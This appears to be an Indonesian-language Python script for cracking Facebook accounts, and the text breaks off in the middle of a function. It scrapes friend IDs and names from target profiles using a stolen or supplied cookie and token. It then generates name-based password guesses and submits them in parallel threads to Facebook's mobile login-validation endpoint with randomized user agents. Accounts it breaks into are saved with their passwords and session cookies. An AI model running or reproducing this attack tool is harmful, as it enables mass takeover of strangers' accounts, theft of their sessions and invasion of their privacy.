###-----[ IMPORT MODULE ]-----###
import requests,json,os,sys,random,datetime,time,re,uuid,subprocess,zlib,base64
from time import time as tod
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as par
from urllib import request
from platform import platform
from urllib.error import URLError
ses = requests.Session()
###-----[ IMPORT RICH ]-----###
from rich.panel import Panel as panel
from rich import print as prints
from rich.tree import Tree
###-----[ APPEN AND MORE ]-----###
id,uid,uid2,id3,id4,id5,id6=[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
akun,method=[],[]
uadia, uadarimu = [],[]
password_list,password_input= [],[]
pwpluss,pwnya=[],[]
rr = random.randint
rc = random.choice
###-----[ MENU WARNA PRINT BIASA ]-----###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
###-----[ MENU WARNA PRINT RICH ]-----###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
###-----[ TANGGAL BULAN TAHUN ]-----###
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
#------------------------------->
M = '\x1b[1;91m' # MERAH
N = '\x1b[0m'    # WARNA MATI
O = '\x1b[1;96m' # BIRU MUDA
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def waktu():
	now = datetime.datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi ðŸ‘‹"
	elif 12 <= hours < 15:timenow = "Selamat Siang ðŸ‘‹"
	elif 15 <= hours < 18:timenow = "Selamat Sore ðŸ‘‹"
	else:timenow = "Selamat Malam ðŸ‘‹"
	return timenow

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		elif fx[:5] in ['61000']           :tahunz = '2024'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
###-----[LOAADING]------###
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r>>> {H}Tunggu Sedang Loading.......!{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
###-----[ CLEAR DISPLAY ]-----###
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
def back():
	menu()
###-----[ LOGO BANNER ]-----###
def banner():
 prints(panel(f"""{H2}                                   
 _____                __ __                 
|  _  |___ ___ ___   |  |  |_ _ ___ _ _ ___ 
|     |_ -| -_| . |  |_   _| | |_ -| | | . |
|__|__|___|___|  _|    |_| |___|___|___|  _|
              |_|                      |_|
""",style=f"white"))
###-----[ LOGIN COOKIES ]-----###

def login():
	try:
		asu = random.choice([m,k,h,b,u])
		os.system("cls" if os.name == "nt" else "clear")
		cookie=input(f'  [{h}•{x}]Koki :{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".tok.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .tok.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
	except:
		pass
###-----[ MENU SCRIPT ]-----###
def menu():
	os.system("cls" if os.name == "nt" else "clear")
	banner()
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P}  - cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login()
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		print(f"\n{P}  - sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		banner()
		os.system('clear')
	#prints(panel(f"{H2}uid  facebook : {uidfb} \nnama facebook : {nama} \nmetode login  : validate facebook.com,",style=f"white"))
	prints(panel(f"{H2}1. crack id publik. \n2. crack id publik massal disarankan. \n3. crack id dari file. \n4. cek hasil crack. \n0. keluar",style=f"white"))
	menu = input(f'>>> pilih 1/6 : ')
	if menu in ["01","1"]:
		idt = input('>>> ID Target : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif menu in ["02","2"]:
		dump_Massal()
	elif menu in ["03","3"]:
		crack_file()
	elif menu in ["04","4"]:
		Result()
	elif menu in ['00','0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'\n>>> Berhasil Keluar+Hapus Cookie ')
		exit()
	else:
		print(f"\n>>> input hanya dengan angka,jangan kosong.")
		time.sleep(3)
		back()

###-----[ DUMP OTOMATIS ]-----###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass


###-----[ MENU RESULT ]-----###
def Result():
	print(f"\n{P}  - 1. cek hasil akun {H}Live{P}. \n  - 2. cek hasil akun {K}Chek{P}. \n  - 3. kembali.")
	lihat_result = input(f'\n  - pilih 1/3 : ')
	if lihat_result in ['2']:
		try:vin = os.listdir('Chek')
		except FileNotFoundError:
			print(f'  - file tidak ditemukan ')
			time.sleep(1)
			back()
		if len(vin)==0:
			print(f'  - anda tidak memiliki file {K}Check {P}')
			time.sleep(1)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Chek/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P}  - %s. %s ( {K}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P}  - %s. %s ( {K}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n  - masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'  - pilih dengan benar ')
				back()
			try:lin = open('Chek/'+geh,'r').read().splitlines()
			except:
				print(f'  - file tidak ditemukan ')
				time.sleep(1)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{K2}{result_[0]}|{result_[1]}[white]")
				prints(tree)
				nocp +=1
			print('')
			input(f'  - ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(1)
			back()
	elif lihat_result in ['1']:
		try:vin = os.listdir('Live')
		except FileNotFoundError:
			print(f'  - file tidak ditemukan ')
			time.sleep(1)
			back()
		if len(vin)==0:
			print(f'  - anda tidak memiliki file {H}Live {P}')
			time.sleep(1)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Live/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P}  - %s. %s ( {H}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P}  - %s. %s ( {H}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n  - masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'  - pilih dengan benar ')
				back()
			try:lin = open('Live/'+geh,'r').read().splitlines()
			except:
				print(f'  - file tidak ditemukan ')
				time.sleep(1)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{H2}{result_[0]}|{result_[1]}[white]").add(f"{H2}{result_[2]}[white]")
				prints(tree)
				nocp +=1
			print("")
			input(f'  - ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(1)
			back()
	elif lihat_result in ['3']:
		back()
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		back()
###-----[ DUMP PUBLIK MASSAL ]-----###
def dump_Massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n>>> pastikan id target tidak private/publik.")
		jum = int(input(f'>>> input jumlah target ? : '))
	except ValueError:
		print(f'>>> input salah ')
		exit()
	if jum<1 or jum>100:
		print(f'>>> gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f'>>> input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r>>> sedang mengumpulkan id, sukses mengumpulkan {len(id)} id...."),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f'  - koneksi sinyal tidak stabil ')
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print('')
		print(f'  - koneksi sinyal tidak stabil ')
		back()

###-----[ CRACK FILE ]-----###
def crack_file():
	try:vin = os.listdir('dump/')
	except FileNotFoundError:
		print('>>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		print ("Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n Buatlah File Dump Id Terlebih dahulu\nSetelah Jadi Masukkan Filenya Kedalam Folder asepyusup di Penyimpanan Internal Kalian\nLalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor ini")
		kontol = input('\n>>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('dump/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('>>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('dump/'+geh,'r').read().splitlines()
		except:
			print('>>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
###-----[ SETTING URUTAN & METODE ]-----###
def setting():
	print("")
	prints(panel(f"{H2}1. urutan old ke new \n2. urutan new ke old \n3. urutan random",style=f"white"))
	urutan_setting = input(f'>>> pilih 1/3 : ')
	if urutan_setting in ['1','01','old']:
		for tua in sorted(id):
			uid2.append(tua)
	elif urutan_setting in ['2','02','new']:
		muda=[]
		for new in sorted(id):
			muda.append(new)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif urutan_setting in ['3','03','random']:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()
	prints(panel(f"{H2}1. metode Validate",style=f"white"))
	login_metode = input(f'>>> pilih : ')
	if login_metode in ["1","01"]:
		prints(f">>> anda menggunakan metode validate.")
		method.append('Validate')
	else:
		print(f">>> input hanya dengan angka,jangan kosong.")
		exit()
	prints(panel(f"{H2}1. password otomatis ( disarankan ) \n2. password gabung \n3. password manual",style=f"white"))
	password_metode = input(f'>>> pilih 1/3 : ')
	if password_metode in ['1','01']:
		Otomatis()
	elif password_metode in ['2','02']:
		Gabung()
	elif password_metode in ['3','03']:
		Manual()
	else:
		print(f"  - input hanya dengan angka,jangan kosong.")
		exit()

###-----[ SETTING PASSWORD OTOMATIS ]-----###
def Otomatis():
	ua = input(f'>>> ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'>>> input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P}>>> anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
>>> {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
>>> {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
>>> mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=10) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pasw = []
			try:
				if len(nama)<6:
					if len(depan)<3:pass
					else:
						pasw.append(nama)
						pasw.append(depan+"123")
						pasw.append(depan+"12345")
						pasw.append(depan+"123456")
						pasw.append(depan+"1234567")
						pasw.append(depan+"12345678")
						pasw.append(depan+"123456789")
						pasw.append(depan+"54321")
						pasw.append(depan+"01")
						pasw.append(depan+"02")
						pasw.append(depan+"03")
						pasw.append(depan+"04")
						pasw.append(depan+"05")
						pasw.append(depan+"2001")
						pasw.append(depan+"2002")
						pasw.append(depan+"2003")
						pasw.append(depan+"2004")
						pasw.append(depan+"2005")
						pasw.append(depan+"2006")
						pasw.append("kamu nanya")
						pasw.append("aplikasi")
				else:
					if len(depan)<3:
						pasw.append(nama)
						pasw.append(depan+"123")
						pasw.append(depan+"12345")
						pasw.append(depan+"123456")
						pasw.append(depan+"1234567")
						pasw.append(depan+"12345678")
						pasw.append(depan+"123456789")
						pasw.append(depan+"54321")
						pasw.append(depan+"01")
						pasw.append(depan+"02")
						pasw.append(depan+"03")
						pasw.append(depan+"04")
						pasw.append(depan+"05")
						pasw.append(depan+"2001")
						pasw.append(depan+"2002")
						pasw.append(depan+"2003")
						pasw.append(depan+"2004")
						pasw.append(depan+"2005")
						pasw.append(depan+"2006")
						pasw.append("kamu nanya")
						pasw.append("aplikasi")
					else:
						pasw.append(nama)
						pasw.append(depan+"123")
						pasw.append(depan+"12345")
						pasw.append(depan+"123456")
						pasw.append(depan+"1234567")
						pasw.append(depan+"12345678")
						pasw.append(depan+"123456789")
						pasw.append(depan+"54321")
						pasw.append(depan+"01")
						pasw.append(depan+"02")
						pasw.append(depan+"03")
						pasw.append(depan+"04")
						pasw.append(depan+"05")
						pasw.append(depan+"2001")
						pasw.append(depan+"2002")
						pasw.append(depan+"2003")
						pasw.append(depan+"2004")
						pasw.append(depan+"2005")
						pasw.append(depan+"2006")
						pasw.append("kamu nanya")
						pasw.append("aplikasi")
				if 'Validate' in method:
					MethodeCrack.submit(_validate_,uid,pasw)
				else:
					MethodeCrack.submit(_validate_,uid,pasw)
			except:pass
	print("\r")
	exit(f"{P}>>> sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD GABUNG ]-----###
def Gabung():
	print(f">>> {M}WARNNING SETTING DULU PASSWORD TEBAKAN MU BIAR DAPET {H}IJO{P}")
	loading()
	print()
	prints(panel(f"Masukan Password Daerah Akun Target Mu Contoh {H2}Kalimantan,Sulawesi,Jakarta{P2}\nAtu Dengan Kata Sandi Ke Ingian Mu Contoh {H2}Asep Ganteng,Kamu Nanya,Bajingan{P2}\nKalu Mau Banyak Password Kasih {H2}(,){P2}",style=f"white"))
	pw_manual = input(f'>>> ketik password tambahan : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f'>>> ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'>>> input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f">>> anda menggunakan user agent bawaan script ")
	else:uadarimu.append('uasc')
	print(f"""
>>> hasil Live akan tersimpan di : {H}Live/{okc}{N}
>>> hasil Chek akan tersimpan di : {K}Chek/{cpc}{N}
>>> mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=35) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pasw = []
			try:
				if len(nama)<6:
					if len(depan)<3:pass
					else:
						pasw.append(nama)
						pasw.append(depan+"123")
						pasw.append(depan+"1234")
						pasw.append(depan+"12345")
						pasw.append(depan+" 123")
				else:
					if len(depan)<3:
						pasw.append(nama)
					else:
						pasw.append(nama)
						pasw.append(depan+"123")
						pasw.append(depan+"1234")
						pasw.append(depan+"12345")
						pasw.append(depan+" 123")
				for xpwd in pwnya:
					pasw.append(xpwd)
				if 'Validate' in method:
					MethodeCrack.submit(_validate_,uid,pasw)
				else:
					MethodeCrack.submit(_validate_,uid,pasw)
			except:pass
	print("\r")
	print(f"{P}>>> sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD MANUAL ]-----###
def Manual():
	print(f">>> {M}WARNNING SETTING DULU PASSWORD TEBAKAN MU BIAR DAPET {H}IJO{P}")
	loading()
	print()
	prints(panel(f"Masukan Password Daerah Akun Target Mu Contoh {H2}Kalimantan,Sulawesi,Jakarta{P2}\nAtu Dengan Kata Sandi Ke Ingian Mu Contoh {H2}Asep Ganteng,Kamu Nanya,Bajingan{P2}\nKalu Mau Banyak Password Kasih {H2}(,){P2}",style=f"white"))
	pw_manual = input(f'>>> ketik password tambahan : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f'>>> ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f'>>> input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P}>>> anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
>>> {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
>>> {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
>>> mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=30) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			for xpwd in pwnya:
				pasw.append(xpwd)
			if 'Validate' in method:
				MethodeCrack.submit(_validate_,uid,pasw)
			else:
				MethodeCrack.submit(_validate_,uid,pasw)
	print("\r")
	exit(f"{P}>>> sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ USERAGENT MENU ]-----###
useragent = []
useragent2 = []
def uas_valid():
  rr = random.randint
  rc = random.choice
  at_ip1 = rc(["605.1.15","534.5.4","531.48.3","533.17.9","535.50.4","535.29.5","532.9","534.14.7"])
  at_ip2 = rc(["8B112","19E258","15E148","15D100","8A293","8B116","8B117","8C148","8C148","17H35","15E148","8B112","21A360","21B77","12A365","12A405","12B410","12B410","12B435","12B440","12B466","11A465","10A406","11A501","11B554a","11D167"])
  at_ip3 = rc(["604.1","6531.48.3","6533.18.5","6535.50.4","6535.29.5","6531.22.7","605.1"])
  model = rc(["bhb-IN","mag-IN","en-us","nan-TW","ro-RO","de-de","yue-HK","en-gb","gl-ES"])
  rullxyz1 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
  rullxyz2 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
  rullxyz3 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
  rullxyz4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
  return rc([rullxyz1,rullxyz2,rullxyz3,rullxyz4])
  
prints(panel(f"{H2}{uas_valid()}[/]",style=f"white"));time.sleep(3)
###-----[ METODE VALIDATE ]-----###
def _validate_(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}>>> {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = uas_valid()
			curl = url()
			link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr").text
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"uid": uid,"next": f"next=https://m.facebook.com/login/save-device/","flow": "login_no_pin","pass": pw}
			hd = {"Host": curl,
"cache-control": "max-age=0",
"sec-ch-ua": f'"Android WebView";v="{str(rr(100,200))}", "Chromium";v="{str(rr(100,200))}", "Not.A/Brand";v="{str(rr(10,50))}"',
"sec-ch-ua-mobile": "?1",
"sec-ch-ua-platform": '"Android"',
"sec-ch-prefers-color-scheme": "dark",
"upgrade-insecure-requests": "1",
"origin": f"https://"+curl,
"content-type": "application/x-www-form-urlencoded",
"user-agent": ua,
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"x-requested-with": "mark.via.gp",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "navigate",
"sec-fetch-user": "?1",
"sec-fetch-dest": "document",
"referer": f"https://{curl}/login/device-based/password/?uid={uid}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br, zstd",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
			post = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=data, headers=hd, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P}>>> {H}{uid}{P}")
				print(f"\r{P}>>> {H}{pw}{P}")
				print(f"\r{P}>>> {H}{tahun(uid)}{P}")
				print(f"\r{P}>>> {H}{kuki}\n{U}{ua}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}|{tahun(uid)}\n")
				cek_apk(kuki)
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P}>>> {K}{uid}|{pw}|{tahun(uid)}{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
	
def url():
	rc = random.choice
	rullxyzcv = rc(["m.facebook.com"])
	return rullxyzcv
	
##### [ CEK APK MODAL ] #####
def cek_apk(kuki):
 session = requests.Session()
 w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
 sop = bs4.BeautifulSoup(w,"html.parser")
 x = sop.find("form",method="post")
 game = [i.text for i in x.find_all("h3")]
 try:
  for i in range(len(game)):
